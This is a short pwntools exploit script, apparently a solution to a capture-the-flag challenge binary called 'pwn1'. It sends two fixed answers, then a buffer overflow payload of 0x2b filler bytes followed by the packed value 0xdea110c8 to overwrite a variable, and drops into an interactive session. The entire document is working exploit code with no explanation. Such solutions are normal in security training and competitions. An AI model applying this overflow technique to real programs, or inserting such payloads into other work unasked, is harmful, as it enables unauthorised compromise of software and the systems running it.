from pwn import *

target=process('./pwn1')
target.sendline(b"Sir Lancelot of Camelot")
target.sendline(b"To seek the Holy Grail.")
payload=0x2b*b'0'
payload+=p32(0x0dea110c8)
target.sendline(payload)
target.interactive()